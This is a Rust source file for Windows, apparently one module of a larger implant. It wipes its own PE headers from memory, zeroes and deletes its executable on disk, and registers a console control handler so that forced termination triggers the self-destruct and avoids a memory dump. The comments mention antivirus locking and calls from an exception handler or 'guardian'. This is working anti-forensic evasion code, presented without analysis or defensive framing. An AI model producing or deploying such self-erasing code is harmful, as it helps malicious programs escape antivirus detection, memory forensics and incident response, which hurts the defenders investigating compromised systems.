//! selfdestruct.rs — In-memory wipe, file deletion, ctrl-handler registration
//!
//! wipe_self()              — zero own PE headers in memory then delete disk image
//! full_destruct()          — wipe + terminate (called from VEH / guardian)
//! register_ctrl_handler()  — install a console ctrl handler that calls full_destruct

#![allow(dead_code, non_snake_case)]

use winapi::um::fileapi::{
    CreateFileW, WriteFile, DeleteFileW, OPEN_EXISTING,
};
use winapi::um::handleapi::{
    CloseHandle, INVALID_HANDLE_VALUE,
};
use winapi::um::winnt::{
    GENERIC_WRITE, FILE_SHARE_DELETE, DELETE,
};
use winapi::um::processthreadsapi::{
    GetCurrentProcess, TerminateProcess,
};
use winapi::shared::minwindef::DWORD;

/// Zero the first 4 KB (PE header region) of our own image in memory.
/// This destroys the MZ/PE signature and import table before disk deletion.
unsafe fn zero_own_headers() {
    // Find our own base via PEB.ImageBaseAddress (offset 0x10 on x64)
    let peb: *const u8;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    let image_base = *(peb.add(0x10) as *const *mut u8);
    core::ptr::write_bytes(image_base, 0u8, 4096);
}

/// Return the full path of the current executable as a null-terminated wide string.
unsafe fn own_path_wide() -> Vec<u16> {
    use winapi::um::libloaderapi::GetModuleFileNameW;
    let mut buf = vec![0u16; 512];
    let len = GetModuleFileNameW(
        core::ptr::null_mut(),
        buf.as_mut_ptr(),
        buf.len() as DWORD,
    );
    buf.truncate(len as usize + 1); // include null terminator
    buf
}

/// Overwrite the on-disk executable with zeros then delete it.
/// Uses FILE_FLAG_DELETE_ON_CLOSE via a DELETE-access open.
pub unsafe fn wipe_self() {
    zero_own_headers();

    let path = own_path_wide();

    // Open with DELETE share so we can schedule deletion on close
    let hfile = CreateFileW(
        path.as_ptr(),
        DELETE,
        FILE_SHARE_DELETE,
        core::ptr::null_mut(),
        OPEN_EXISTING,
        // FILE_FLAG_DELETE_ON_CLOSE = 0x04000000
        0x04000000,
        core::ptr::null_mut(),
    );
    if hfile != INVALID_HANDLE_VALUE {
        // Overwrite with zeros (best-effort, file may be locked by AV)
        let zeros = vec![0u8; 4096];
        let mut written: DWORD = 0;
        WriteFile(
            hfile,
            zeros.as_ptr() as *const _,
            zeros.len() as DWORD,
            &mut written,
            core::ptr::null_mut(),
        );
        CloseHandle(hfile);
    } else {
        // Fallback: plain delete
        DeleteFileW(path.as_ptr());
    }
}

/// Full destructive cleanup: wipe disk image, then terminate the process.
/// Safe to call from any thread or VEH context.
pub unsafe fn full_destruct() {
    wipe_self();
    TerminateProcess(GetCurrentProcess(), 0);
}

/// Console ctrl handler — intercepts CTRL+C, CTRL+BREAK, CTRL+CLOSE etc.
/// Calls full_destruct() on any event so the process self-wipes instead of
/// producing a memory dump on forced termination.
unsafe extern "system" fn ctrl_handler(_ctrl_type: DWORD) -> winapi::shared::minwindef::BOOL {
    full_destruct();
    winapi::shared::minwindef::TRUE
}

/// Register the ctrl handler with the OS.
/// Must be called once during startup (before any console I/O).
pub unsafe fn register_ctrl_handler() {
    use winapi::um::consoleapi::SetConsoleCtrlHandler;
    SetConsoleCtrlHandler(Some(ctrl_handler), winapi::shared::minwindef::TRUE);
}
